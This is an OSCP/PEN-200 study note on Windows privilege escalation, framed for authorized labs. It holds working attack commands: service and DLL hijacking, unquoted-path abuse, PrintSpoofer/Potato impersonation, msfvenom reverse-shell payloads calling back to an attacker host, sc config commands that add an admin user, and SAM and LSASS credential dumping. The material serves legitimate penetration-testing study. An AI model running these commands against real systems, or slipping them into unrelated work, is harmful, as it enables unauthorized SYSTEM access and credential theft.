Windows Privilege Escalation — OSCP / PEN-200 Methodology#

ABSTRACTHow to Use This Note

Companion to Active-Directory-OSCP-Methodology and Linux-PrivEsc-OSCP-Methodology. You just landed a shell on a Windows box as an unprivileged user and need to become a local administrator or NT AUTHORITY\SYSTEM. This note is the trigger-driven loop for that: enumerate → spot a misconfiguration → match it to a technique → execute → confirm.

Everything here is sourced from Chapter 16 (Windows Privilege Escalation) of the uploaded PEN-200 PDF. Items the PDF doesn't contain are explicitly flagged so you never bring a non-course tool into the exam by mistake.

WARNINGScope & Authorization

Assume this is for an authorized OSCP/PEN-200 lab environment only. Reboots, service restarts, and kernel exploits can disrupt production — in a real engagement only do them in coordination with the client.

INFOSource Rules Applied
  • The uploaded PEN-200 PDF (Ch.16) is the primary source.
  • No vectors are invented beyond what the PDF supports.
  • Anything absent → > [!warning] Not Found in Uploaded PDF.
  • Useful-but-absent real-world tools → > [!info] Additional OSCP Context.

Windows PrivEsc Master Checklist#

TIPTrigger

Work this top-to-bottom on every new Windows shell. The cheap wins (sensitive files, PowerShell history) come before the heavier service/exploit vectors. Re-run the whole loop every time you gain a new user context — privesc is cyclical.

Phase 0 — Situational Awareness#

INFOSearch Keywords

whoami · whoami /groups · whoami /priv · systeminfo · ipconfig /all · netstat -ano · Get-LocalUser · Get-LocalGroupMember

  • Who am I + hostname: whoami, hostname implies role (WEB01, MSSQL01).
  • My groups: whoami /groups (helpdesk? Remote Desktop Users? Backup Operators?).
  • My privileges: whoami /priv (the single most important command — see #Technique — Abusing SeImpersonatePrivilege (Potato / PrintSpoofer)).
  • Other users/groups: Get-LocalUser, Get-LocalGroup, Get-LocalGroupMember Administrators.
  • OS/arch: systeminfo (build number → exact version; 32 vs 64-bit).
  • Network: ipconfig /all, route print, netstat -ano (pivots + which services listen).
  • Installed apps: Get-ItemProperty "HKLM:\SOFTWARE\...\Uninstall\*" | select displayname.
  • Running processes: Get-Process (correlate PIDs with netstat).
NEXT ACTIONNext Action

Note any non-standard app (XAMPP, KeePass), any admin-looking user (daveadmin, backupadmin), and any privilege starting with Se.... Then go to Phase 1.

Phase 1 — Hunt for Sensitive Information (cheapest wins)#

INFOSearch Keywords

Get-ChildItem · *.kdbx · *.txt · *.ini · *.config · PSReadLine · ConsoleHost_history.txt · transcript

  • Search files: password DBs (*.kdbx), configs (*.ini,*.txt), docs (*.pdf,*.xls*,*.doc*).
  • Read app config files (e.g. C:\xampp\...\my.ini) — often contain plaintext passwords.
  • PowerShell history: (Get-PSReadlineOption).HistorySavePath → type it.
  • PowerShell transcripts: look in C:\Users\Public\Transcripts\, home dirs.
  • Reuse every credential found against every user/service (#Sensitive Information Hunting Workflow).
NEXT ACTIONNext Action

Found a password for an admin user → runas / RDP / WinRM as them → re-run Phase 0/1 as the new user. No creds yet → Phase 2.

Phase 2 — Abuse Windows Services#

INFOSearch Keywords

Get-CimInstance win32_service · icacls · BUILTIN\Users:(F) · unquoted · myDLL.dll NAME NOT FOUND

  • List services + binary paths (look for non-System32 paths = user-installed).
  • Binary hijack: writable service .exe? → #Technique — Service Binary Hijacking.
  • DLL hijack: service loads a missing/writable DLL? → #Technique — Service DLL Hijacking.
  • Unquoted path: spaces + no quotes + writable interpreted dir? → #Technique — Unquoted Service Paths.
  • Can I restart the service? (Start/Stop/Restart-Service) If not, need a reboot (SeShutdownPrivilege).

Phase 3 — Abuse Other Components#

  • Scheduled tasks: task runs as admin/SYSTEM with a writable action binary? → #Technique — Scheduled Tasks.
  • Privilege abuse: SeImpersonatePrivilege (IIS/service accounts) → #Technique — Abusing SeImpersonatePrivilege (Potato / PrintSpoofer).
  • Exploits: vulnerable installed app or kernel exploit → #Technique — Using Exploits (App / Kernel / Privilege).

Phase 4 — Confirm & Pivot#

  • Confirm escalation: Get-LocalGroupMember Administrators (new user added?) or whoami shows nt authority\system.
  • As admin/SYSTEM → dump credentials and continue the domain attack → Active-Directory-OSCP-Methodology#Technique — Dumping Credentials with Mimikatz.
  • Restore anything you replaced (service binaries, task binaries) to leave the system working.
CHECKDecision Logic

Order of preference: found credentials > service/task hijack > privilege abuse > kernel exploit. Exploits that can crash the box are the last resort.

Trigger-Based Decision Workflow#

TIPTrigger

Branch on your current state. Follow the arrows.

Workflow A — Fresh Unprivileged Shell#

CHECKDecision Logic

Enumerate before exploiting. The fastest path to admin is usually a password someone left lying around, not a service hijack.

  1. Run #Enumeration Checklist (Situational Awareness) in full.
  2. whoami /priv — if you see SeImpersonatePrivilege (or other dangerous Se*), jump straight to #Technique — Abusing SeImpersonatePrivilege (Potato / PrintSpoofer).
  3. Otherwise hunt sensitive info → #Sensitive Information Hunting Workflow.
  4. No creds found → enumerate services → Workflow B.

Workflow B — You Found a Service Misconfiguration#

CHECKDecision Logic

Match the misconfig to the technique:

  • Writable service .exe → #Technique — Service Binary Hijacking
  • Service loads a missing/writable DLL → #Technique — Service DLL Hijacking
  • Unquoted path + writable interpreted dir → #Technique — Unquoted Service Paths

Then ask: can I restart it? Yes → Restart-Service. No → reboot if StartMode=Auto and you hold SeShutdownPrivilege; otherwise wait for a natural restart.

PG extension: if accesschk/PowerUp shows you hold SERVICE_CHANGE_CONFIG / SERVICE_ALL_ACCESS (rights on the service config, not just the file), skip the binary swap and repoint it with sc config <svc> binPath= → #PG Workflow — Service Binary and Service Config Privesc.

Workflow C — You Found Credentials#

  1. Identify the user's groups (net user <USERNAME>): Administrators? Remote Desktop Users? Remote Management Users?
  2. Pick the access method → #Technique — Running as Another User (runas / RDP / WinRM).
  3. As the new user, restart the whole loop (Phase 0/1) — new context, new readable files.

Workflow D — You Have a Dangerous Privilege#

  1. SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege → #Technique — Abusing SeImpersonatePrivilege (Potato / PrintSpoofer) (PrintSpoofer, the course tool). On a modern 2019/2022/Win11 box, pick the matching potato → #PG Workflow — Token Impersonation Privesc (SeImpersonate to SYSTEM).
  2. SeBackupPrivilege/SeRestorePrivilege → dump SAM+SYSTEM hives → secretsdump; SeDebugPrivilege → dump LSASS; SeLoadDriver/SeTakeOwnership → #PG Workflow — Other High-Value Privilege Abuses. The PDF only names these → #Technique — Using Exploits (App / Kernel / Privilege).

Technique — Hidden in Plain View (File Hunting)#

INFOSearch Keywords

Get-ChildItem · -Include *.kdbx,*.txt,*.ini · -Recurse · -ErrorAction SilentlyContinue · type · cat

Trigger Words: "fresh shell", "look for passwords", "config files", "password manager".

Purpose: Find credentials users/apps left on disk — the cheapest privilege escalation.

EXAMPLECommand
POWERSHELL
# Password manager databases
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
# App config files (example: XAMPP)
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
# Documents in a user's home
Get-ChildItem -Path C:\Users\<USERNAME>\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
# Read a candidate file
type C:\xampp\mysql\bin\my.ini
SUCCESSWhat Good Output Looks Like

A config line like password = admin123admin123!, or a meeting note naming a user's password.

WARNINGWhat This Means

A reusable credential — often for a different, more privileged user (the PDF's my.ini leaked backupadmin's password in a comment).

NEXT ACTIONNext Action

→ #Sensitive Information Hunting Workflow (reuse it everywhere), then #Technique — Running as Another User (runas / RDP / WinRM).

CHECKDecision Logic

Permissions differ per user — a file you couldn't read as dave may be readable as steve. Re-hunt after every context switch.

Technique — PowerShell History & Transcripts#

INFOSearch Keywords

Get-History · Get-PSReadlineOption · HistorySavePath · ConsoleHost_history.txt · Start-Transcript · Clear-History

Trigger Words: "admin cleared history", "PowerShell logging", "transcript".

Purpose: Recover commands (and embedded plaintext credentials) that admins thought they had deleted.

EXAMPLECommand
POWERSHELL
Get-History                                   # session-only (usually empty)
(Get-PSReadlineOption).HistorySavePath        # real on-disk history path
type C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
type C:\Users\Public\Transcripts\transcript01.txt   # transcript, if enabled
SUCCESSWhat Good Output Looks Like

History lines like Set-Secret -Name "Server02 Admin PW" -Secret "paperEarMonitor33@", or a transcript showing ConvertTo-SecureString "qwertqwertqwert123!!" used to build a PSCredential.

WARNINGWhat This Means

Clear-History only clears the session list — PSReadline keeps the on-disk file. Transcripts log full plaintext, including secure-string passwords entered before Stop-Transcript.

NEXT ACTIONNext Action

Rebuild the credential and authenticate → #Technique — Running as Another User (runas / RDP / WinRM).

EXAMPLEFollow-Up Commands
POWERSHELL
$password = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("<USERNAME>", $password)
Enter-PSSession -ComputerName <TARGET_HOST> -Credential $cred
CHECKDecision Logic

Always check PSReadline history before assuming the box is clean — most admins clear the wrong history.

Technique — Running as Another User (runas / RDP / WinRM)#

INFOSearch Keywords

runas /user: · RDP · WinRM · evil-winrm · Remote Desktop Users · Remote Management Users · Log on as a batch job

Trigger Words: "I have creds but only a shell", "need to switch user".

Purpose: Turn a found credential into execution as that (often privileged) user.

EXAMPLECommand
CMD
:: Requires interactive/GUI session (password prompt won't accept input in a bind shell/WinRM)
runas /user:<USERNAME> cmd
BASH
# From Kali over WinRM (PDF uses this in Ch16). Escape ! in the password.
evil-winrm -i <TARGET_IP> -u <USERNAME> -p '<PASSWORD>'
SUCCESSWhat Good Output Looks Like

A new shell whose whoami shows the target (e.g. clientwk220\daveadmin).

WARNINGWhat This Means

You now operate with the new user's permissions — re-run enumeration; new files become readable.

NEXT ACTIONNext Action

If still not admin → back to #Windows PrivEsc Master Checklist Phase 2/3 as the new user.

CHECKDecision Logic

Pick the channel by group membership: Remote Desktop Users → RDP; Remote Management Users → WinRM/evil-winrm; GUI present → runas; target has an active session → PsExec; user has Log on as a batch job → schedule a task as them.

Technique — Automated Enumeration (winPEAS)#

INFOSearch Keywords

winPEAS · winPEASx64.exe · iwr · http.server · Seatbelt · JAWS

Trigger Words: "time pressure", "lots of files", "automate enum".

Purpose: Quickly surface privilege-escalation vectors and sensitive data.

EXAMPLECommand
BASH
# On Kali: serve the binary
cp /usr/share/peass/winpeas/winPEASx64.exe .
python3 -m http.server 80
POWERSHELL
# On target: download + run
iwr -uri http://<KALI_IP>/winPEASx64.exe -Outfile winPEAS.exe
.\winPEAS.exe
SUCCESSWhat Good Output Looks Like

Colour-coded findings: red = misconfig/privilege of interest, green = protection enabled, cyan/blue = active/disabled users.

WARNINGWhat This Means

A fast overview — but winPEAS misses things (in the PDF it missed the desktop note, the PS history, and the transcript, and misidentified the OS).

NEXT ACTIONNext Action

Verify every interesting hit manually; never rely on tool output alone.

INFOAdditional OSCP Context

If AV blocks winPEAS, the PDF names Seatbelt and JAWS as alternatives, or fall back to manual enumeration.

CHECKDecision Logic

Automated tools augment manual work; they don't replace it. Run winPEAS first, then hand-check the home dirs, history, and transcripts.

Technique — Service Binary Hijacking#

INFOSearch Keywords

Get-CimInstance win32_service · icacls · BUILTIN\Users:(F) · StartMode Auto · net stop · shutdown /r

Trigger Words: "service binary outside System32", "Full access on a service exe".

Purpose: Replace a service's executable (that you can write) so it runs your payload as the service account (often LocalSystem).

EXAMPLECommand
POWERSHELL
# 1) Enumerate running services + paths
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
# 2) Check binary permissions (look for BUILTIN\Users:(F))
icacls "<BINARY_PATH>"
# 3) Check startup type (Auto = will run on reboot)
Get-CimInstance -ClassName win32_service | Select Name,StartMode | Where-Object {$_.Name -like '<SERVICE>'}
BASH
# On Kali: build a payload (adduser.c creates dave2 + adds to Administrators)
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
POWERSHELL
# 4) Back up original, drop payload, trigger
move <BINARY_PATH> C:\Users\<USERNAME>\orig.exe.bak
iwr -uri http://<KALI_IP>/adduser.exe -Outfile <BINARY_PATH>
net stop <SERVICE>; net start <SERVICE>     # if denied, reboot:
shutdown /r /t 0                            # needs SeShutdownPrivilege + StartMode=Auto
SUCCESSWhat Good Output Looks Like

icacls shows BUILTIN\Users:(F) without a leading (I) (set on purpose, not inherited). After trigger, Get-LocalGroupMember administrators lists your new user.

WARNINGWhat This Means

(F) = Full access → you can overwrite the binary. Mask key: F=Full, M=Modify, RX=Read+Execute, R=Read, W=Write; (I)=inherited.

NEXT ACTIONNext Action

Confirm with Get-LocalGroupMember administrators, then restore the original binary. Pivot → Active-Directory-OSCP-Methodology#Technique — Dumping Credentials with Mimikatz.

EXAMPLEFollow-Up Commands
POWERSHELL
# PowerUp automation
iwr -uri http://<KALI_IP>/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
Get-ModifiableServiceFile
Install-ServiceBinary -Name '<SERVICE>'    # AbuseFunction (default: creates user john / Password123!)
CHECKDecision Logic

If you can't stop/start the service and StartMode isn't Auto, you must wait for a manual restart. PowerUp's AbuseFunction can fail on services with path-style arguments (e.g. --defaults-file=...) — fall back to manual replacement.

Technique — Service DLL Hijacking#

INFOSearch Keywords

Process Monitor · Procmon · CreateFile · NAME NOT FOUND · myDLL.dll · DLL search order · Restart-Service

Trigger Words: "can't replace the exe", "service loads a DLL", "missing DLL".

Purpose: When the service .exe isn't writable, hijack a DLL it loads — especially a missing DLL it searches for in a directory you can write to.

EXAMPLECommand
POWERSHELL
# Identify which DLLs the service looks for (run Procmon as admin on a test box;
# filter Process Name is <service>.exe, then restart the service)
Restart-Service <SERVICE>
$env:path        # confirms the directories in the DLL search order
BASH
# Build a malicious DLL (payload in DllMain / DLL_PROCESS_ATTACH)
x86_64-w64-mingw32-gcc myDLL.cpp --shared -o <DLL_NAME>
POWERSHELL
# Drop it in the first writable search-order dir (e.g. the binary's own folder) and restart
iwr -uri http://<KALI_IP>/<DLL_NAME> -Outfile <DLL_NAME>
Restart-Service <SERVICE>
SUCCESSWhat Good Output Looks Like

In Procmon: CreateFile calls for <DLL_NAME> returning NAME NOT FOUND across search-order paths. After dropping the DLL, the service loads it and your payload runs.

WARNINGWhat This Means

The service depends on a DLL it can't find → you supply it. DLL search order: (1) app dir, (2) System32, (3) 16-bit System, (4) Windows dir, (5) current dir, (6) PATH.

NEXT ACTIONNext Action

Confirm new admin user, restore state, pivot.

CHECKDecision Logic

Procmon needs admin — the PDF's standard approach is to install the service on a box you control to observe its DLL loads, then exploit on target.

INFOAdditional OSCP Context

Process Monitor (Procmon) is a Sysinternals GUI tool. There is no headless command-line equivalent shown in the PDF; capture DLL activity on a lab machine you administer.

Technique — Unquoted Service Paths#

INFOSearch Keywords

wmic service get name,pathname · findstr · spaces · missing quotes · icacls · Start-Service

Trigger Words: "service path has spaces and no quotes", "write to a Program Files subdir".

Purpose: Exploit how Windows parses an unquoted path with spaces by planting an executable at an earlier interpreted path.

EXAMPLECommand
CMD
:: Find unquoted, non-Windows service paths (run in cmd.exe to avoid quote-escaping)
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
POWERSHELL
# For "C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe",
# Windows tries: C:\Program.exe | C:\Program Files\Enterprise.exe | C:\Program Files\Enterprise Apps\Current.exe | ...
icacls "C:\Program Files\Enterprise Apps"     # look for BUILTIN\Users with (W)
# Plant payload named for the interpreted segment, then start the service
iwr -uri http://<KALI_IP>/adduser.exe -Outfile Current.exe
copy .\Current.exe "C:\Program Files\Enterprise Apps\Current.exe"
Start-Service <SERVICE>
SUCCESSWhat Good Output Looks Like

wmic/findstr lists a service whose path has spaces and no quotes; icacls shows BUILTIN\Users:(...)(W) on an interpreted directory. After Start-Service, your user is created (the service may error — the payload still ran).

WARNINGWhat This Means

Windows appends .exe at each space and runs the first match it finds → a binary you plant earlier in the path executes with the service's privileges.

NEXT ACTIONNext Action

Confirm Get-LocalGroupMember administrators, stop service, delete your binary to restore.

EXAMPLEFollow-Up Commands
POWERSHELL
. .\PowerUp.ps1
Get-UnquotedService
Write-ServiceBinary -Name '<SERVICE>' -Path '<HIJACK_PATH>'   # AbuseFunction
CHECKDecision Logic

You usually can't write to C:\ or C:\Program Files directly — the software's own subdirectory is the realistic writable target.

Technique — Scheduled Tasks#

INFOSearch Keywords

schtasks /query /fo LIST /v · Get-ScheduledTask · Run As User · Task To Run · icacls

Trigger Words: "task runs as admin/SYSTEM", "writable task binary".

Purpose: Replace the binary a scheduled task executes, so it runs your payload as the task's (privileged) principal.

EXAMPLECommand
POWERSHELL
schtasks /query /fo LIST /v        # inspect Author, TaskName, Task To Run, Run As User, Next Run Time
# If "Task To Run" points at a file you can write:
icacls C:\Users\<USERNAME>\Pictures\<TASK_BINARY>.exe
iwr -Uri http://<KALI_IP>/adduser.exe -Outfile <TASK_BINARY>.exe
move .\Pictures\<TASK_BINARY>.exe <TASK_BINARY>.exe.bak
move .\<TASK_BINARY>.exe .\Pictures\
SUCCESSWhat Good Output Looks Like

A task with Run As User: daveadmin, a short/recurring Next Run Time, and a Task To Run path in a folder you can write (icacls shows (F)).

WARNINGWhat This Means

Three questions decide viability: (1) which user runs it? (must be more privileged), (2) will the trigger fire again?, (3) what does it execute? (replaceable binary/script).

NEXT ACTIONNext Action

Wait for the trigger, confirm net localgroup administrators, then restore the original task binary.

CHECKDecision Logic

If the trigger already fired and won't recur (e.g. a past one-time task), it's not exploitable — note it in the report and move on.

Technique — Abusing SeImpersonatePrivilege (Potato / PrintSpoofer)#

INFOSearch Keywords

whoami /priv · SeImpersonatePrivilege · PrintSpoofer · named pipe · IIS · nt authority\system

Trigger Words: "SeImpersonatePrivilege Enabled", "web shell on IIS", "service account".

Purpose: Abuse token impersonation to run code as NT AUTHORITY\SYSTEM.

EXAMPLECommand
POWERSHELL
whoami /priv      # confirm SeImpersonatePrivilege is present/Enabled
iwr -uri http://<KALI_IP>/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
.\PrintSpoofer64.exe -i -c powershell.exe
INFOWhat whoami /priv looks like (PDF Listing 451 — foothold user dave)
SHELL
SeChangeNotifyPrivilege        Bypass traverse checking                  Enabled
SeImpersonatePrivilege         Impersonate a client after authentication Enabled   ← the win
SeIncreaseWorkingSetPrivilege  Increase a process working set            Disabled

SeImpersonatePrivilege = Enabled is the trigger. Held by default by Administrators and the LOCAL SERVICE / NETWORK SERVICE / SERVICE accounts and IIS app-pool identities — so it turns up constantly after web/service exploitation.

SUCCESSWhat Good Output Looks Like
SHELL
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK

followed by whoami → nt authority\system.

WARNINGWhat This Means

SeImpersonatePrivilege lets a process impersonate a client that connects to its named pipe. PrintSpoofer coerces SYSTEM into connecting → you impersonate SYSTEM. This privilege is default for LocalService/NetworkService/LocalSystem and IIS app-pool identities — extremely common after exploiting a web server.

NEXT ACTIONNext Action

You are SYSTEM → dump creds and pivot → Active-Directory-OSCP-Methodology#Technique — Dumping Credentials with Mimikatz.

INFOAdditional OSCP Context

CHECKDecision Logic

whoami /priv is your trigger. See SeImpersonatePrivilege → reach for PrintSpoofer first; try a Potato variant if PrintSpoofer fails on the target's Windows version. For the full per-OS potato selection (GodPotato / RoguePotato / JuicyPotato) and the MSSQL/IIS landing scenarios, see #PG Workflow — Token Impersonation Privesc (SeImpersonate to SYSTEM).

PG Workflow — Token Impersonation Privesc (SeImpersonate to SYSTEM)#

INFOSearch Keywords

whoami /priv · SeImpersonatePrivilege · SeAssignPrimaryTokenPrivilege · PrintSpoofer · JuicyPotato · RoguePotato · GodPotato · EfsPotato/SharpEfsPotato · named pipe · IIS app-pool · MSSQL · xp_cmdshell

Trigger Words: "service account shell", "IIS/ASPX webshell", "xp_cmdshell as mssql", "SeImpersonate Enabled", "GodPotato", "potato".

Purpose: Convert a shell that holds SeImpersonatePrivilege (or SeAssignPrimaryToken) into NT AUTHORITY\SYSTEM. The single most common PG Windows privesc once you land as a service account.

CHECKHow you usually land here on PG
  • IIS / web-app RCE → shell as iis apppool\<site> or NETWORK SERVICE (file upload, ASPX webshell, deserialization). See Web-Attacks-OSCP-Methodology#Technique — File Upload (Executable Files).
  • MSSQL xp_cmdshell → runs as the mssql$INSTANCE / NT Service\MSSQLSERVER account, which has SeImpersonate → see Web-Attacks-OSCP-Methodology#Technique — SQLi to Code Execution.
  • Any cracked / reused service account. First action on every Windows foothold: whoami /priv.

  • JuicyPotato is dead on Server 2019 / Win10 1809+ — don't burn time on it, go RoguePotato/GodPotato.
  • From a non-interactive webshell, prefer a one-shot -c/-cmd (add an admin, or run a reverse-shell nc.exe) over -i.
  • Match architecture (use the x64 build) and the .NET version for GodPotato.

PG Workflow — Service Binary and Service Config Privesc#

INFOSearch Keywords

accesschk.exe -uwcqv · sc qc · sc config binPath= · SERVICE_ALL_ACCESS · SERVICE_CHANGE_CONFIG · weak file ACL · msfvenom -f exe-service · net localgroup administrators

Trigger Words: "I can edit a service", "writable service exe", "sc config", "binpath", "service runs as LocalSystem".

Purpose: Make a service that runs as LocalSystem execute YOUR code. Three independent flaws can grant this — enumerate to learn which one you have, then take the matching branch.

EXAMPLEStep 1 — enumerate services and the rights you hold
CMD
:: Sysinternals accesschk (NOT in PDF) — services THIS user can modify:
accesschk.exe -accepteula
accesschk.exe -uwcqv "%USERNAME%" *
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -ucqv <SERVICE>            :: rights granted on one service
sc qc <SERVICE>                           :: BINARY_PATH_NAME + SERVICE_START_NAME (the account)
sc query <SERVICE>                        :: running state
POWERSHELL
# PDF-grounded equivalents (use these if accesschk is blocked):
Get-CimInstance win32_service | Select Name,State,StartMode,PathName,StartName
icacls "<BINARY_PATH>"
. .\PowerUp.ps1 ; Get-ModifiableService ; Get-ModifiableServiceFile ; Get-UnquotedService
WARNINGThree branches — match the flaw to the fix
  • (A) Weak file ACL on the service .exe (icacls shows Users/Authenticated Users:(F|M|W)) → overwrite the binary. Course version: #Technique — Service Binary Hijacking; PG payload tweak in Step 2A below.
  • **(B) Weak service-config rights (accesschk shows SERVICE_ALL_ACCESS or SERVICE_CHANGE_CONFIG) → you don't need to touch any file; just repoint binPath** (Step 2B).
  • (C) Unquoted service path + a writable interpreted directory → #Technique — Unquoted Service Paths.
EXAMPLEStep 2A / 2C — replace the binary with a service-SAFE payload
BASH
# A plain .exe often dies with error 1053 ("did not respond in time"); -f exe-service embeds the SCM dispatcher:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=443 -f exe-service -o evil.exe
# (or the course-style adduser payload:  x86_64-w64-mingw32-gcc adduser.c -o evil.exe)
CMD
:: drop over the writable binary / interpreted path, then restart:
sc stop <SERVICE> & sc start <SERVICE>
EXAMPLEStep 2B — abuse weak service config (the classic PG sc config)
CMD
:: NOTE the required SPACE after every "key=" — sc syntax is unforgiving.
sc config <SERVICE> binPath= "C:\Windows\Temp\evil.exe"
:: ...or skip a binary entirely and run commands directly as SYSTEM on start:
sc config <SERVICE> binPath= "cmd /c net user pwn P@ssw0rd123! /add & net localgroup administrators pwn /add"
sc config <SERVICE> obj= "LocalSystem" password= ""     :: force SYSTEM context if it isn't already
sc stop <SERVICE> & sc start <SERVICE>
SUCCESSWhat Good Output Looks Like

sc qc reflects your new BINARY_PATH_NAME; after sc start, the SCM may print 1053 but the command already ran — confirm with net localgroup administrators (your user is now a member) or your nc listener catches a SYSTEM shell.

WARNINGPitfalls and cleanup
  • Service fails to start ≠ failure: the payload runs before the SCM times out. Use -f exe-service to get both a clean start and a shell.
  • Always restore: capture the original first (sc qc), then sc config <SERVICE> binPath= "<ORIGINAL_PATH>", and put back any overwritten binary.
  • Can't stop/start? The same Auto-start + SeShutdownPrivilege reboot trick from #Technique — Service Binary Hijacking applies.
NEXT ACTIONNext Action

Confirm Get-LocalGroupMember Administrators (or catch the SYSTEM shell) → restore the service → dump creds → Active-Directory-OSCP-Methodology.

CHECKDecision Logic

accesschk/PowerUp tells you the branch. Prefer (B) sc config when you have SERVICE_CHANGE_CONFIG — fastest, no file write. Else (A) binary replacement, else (C) unquoted path.

PG Workflow — Other High-Value Privilege Abuses#

WARNINGBeyond the PDF — Ch16 lists these by name only

The PDF names SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnership, SeLoadDriver, SeDebug, SeManageVolume as "may lead to privilege escalation" but gives no workflow. The common PG plays:

  • SeBackup / SeRestore → read protected files: reg save hklm\sam sam + reg save hklm\system system → exfil → impacket-secretsdump -sam sam -system system LOCAL → crack / pass-the-hash the local Administrator.
  • SeDebugPrivilege → dump LSASS: procdump -accepteula -ma lsass.exe out.dmp (then mimikatz sekurlsa::minidump), or Task Manager → lsass → Create dump file.
  • SeTakeOwnership → takeown /f <file> then icacls <file> /grant <user>:F on a SYSTEM-owned binary you can then replace.
  • SeLoadDriverPrivilege → load a known-vulnerable signed driver (e.g. Capcom.sys) — advanced, real crash risk.
  • AlwaysInstallElevated (both HKLM + HKCU ...\Installer\AlwaysInstallElevated = 1) → msfvenom -p windows/x64/shell_reverse_tcp ... -f msi -o evil.msi → msiexec /quiet /qn /i evil.msi runs as SYSTEM.
CHECKDecision Logic

These map straight off whoami /priv. For the exam writeup, still describe the course path where one exists; reach for these when the standard service/token vectors aren't present.

Enumeration Checklist (Situational Awareness)#

TIPTrigger

The PDF's required situational-awareness set. Gather all of it before deciding on a vector.

  • Username + hostname: whoami (hostname hints at role)
  • My groups: whoami /groups
  • My privileges: whoami /priv ← check for Se* (esp. SeImpersonatePrivilege)
  • Local users: net user / Get-LocalUser
  • Local groups + members: Get-LocalGroup / Get-LocalGroupMember Administrators
  • OS / version / arch: systeminfo (build number → exact version)
  • Network interfaces/routes/connections: ipconfig /all, route print, netstat -ano
  • Installed applications: Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname (and the non-Wow6432Node path)

  • Check C:\Program Files (x86) + Downloads for apps the registry missed
  • Then: sensitive files, PS history, transcripts → #Sensitive Information Hunting Workflow

CHECKDecision Logic

Active Recall Questions#

DECISIONFirst Command

You just got a shell. What's the single most important command for finding a fast escalation, and what are you looking for? (Answer: whoami /priv — look for SeImpersonatePrivilege (PrintSpoofer/Potato → SYSTEM) and other dangerous Se* privileges.)

DECISIONicacls Mask

In icacls output, what does BUILTIN\Users:(F) mean for a service binary, and why does a leading (I) matter? (Answer: F = Full access → Users can replace the binary. (I) means inherited; its absence means the permission was set deliberately.)

DECISIONCan't Restart

You can replace a service binary but lack permission to restart the service. What two conditions let you trigger it anyway? (Answer: the service StartMode is Auto AND you hold SeShutdownPrivilege, so shutdown /r /t 0 reboots and auto-starts it.)

DECISIONCleared History

An admin ran Clear-History. Why might their commands still be recoverable, and where? (Answer: Clear-History only clears the session list; PSReadline keeps an on-disk file at (Get-PSReadlineOption).HistorySavePath (ConsoleHost_history.txt).)

DECISIONUnquoted Path Parsing

For C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe (unquoted), name the first three paths Windows tries. (Answer: C:\Program.exe, C:\Program Files\Enterprise.exe, C:\Program Files\Enterprise Apps\Current.exe.)

DECISIONDLL Hijack Discovery

Which tool finds the DLLs a service tries to load, and what result indicates a hijackable missing DLL? (Answer: Process Monitor (Procmon), filtered on the service process; a CreateFile for the DLL returning NAME NOT FOUND.)

DECISIONScheduled Task Viability

What three questions determine whether a scheduled task is a viable privesc vector? (Answer: which user/principal runs it; whether the trigger will fire again; what action/binary it executes (and can you write it).)

DECISIONSeImpersonate Source

Why is SeImpersonatePrivilege so commonly available after exploiting a web server? (Answer: IIS app-pool identities and the service accounts LocalService/NetworkService/LocalSystem all have it by default.)

DECISIONTool Trust

The PDF stresses not trusting automated tools blindly. Give two things winPEAS missed in the example. (Answer: it misidentified the OS as Windows 10, and missed the desktop note, the PSReadline history, and the transcript file.)

DECISIONRestore Discipline

After a successful binary/task hijack, what should you always do, and why? (Answer: restore the original binary/task so the service works again — leaving it broken disrupts the system and is poor practice.)

DECISIONPotato Selection (PG)

You have SeImpersonatePrivilege on Windows Server 2019. Why skip JuicyPotato, and what do you use instead? (Answer: JuicyPotato's DCOM/CLSID path was patched on Server 2019 / Win10 1809+. Use RoguePotato — with an OXID relay socat tcp-listen:135,reuseaddr,fork tcp:<target>:9999 — or GodPotato (not in the PDF). PrintSpoofer also works if the Print Spooler is up.)

DECISIONsc config binPath (PG)

You hold SERVICE_CHANGE_CONFIG on a service running as LocalSystem but cannot write its binary. How do you escalate? (Answer: repoint it — sc config <svc> binPath= "cmd /c net user pwn P@ss! /add & net localgroup administrators pwn /add" (note the space after binPath=), then sc stop/sc start. SCM may return 1053 but the command runs as SYSTEM.)

DECISIONService Payload 1053 (PG)

Why does an ordinary reverse-shell .exe often fail as a service binary, and what's the fix? (Answer: a plain exe never reports to the Service Control Manager, so SCM kills it with error 1053. Build a service-aware binary: msfvenom -p ... -f exe-service.)

DECISIONSeBackupPrivilege (PG)

The PDF only names SeBackupPrivilege. What's the standard PG workflow to abuse it? (Answer: read the protected hives — reg save hklm\sam sam + reg save hklm\system system — exfil, then impacket-secretsdump -sam sam -system system LOCAL to recover the local Administrator hash for cracking / pass-the-hash.)

SUCCESSYou Are Done When
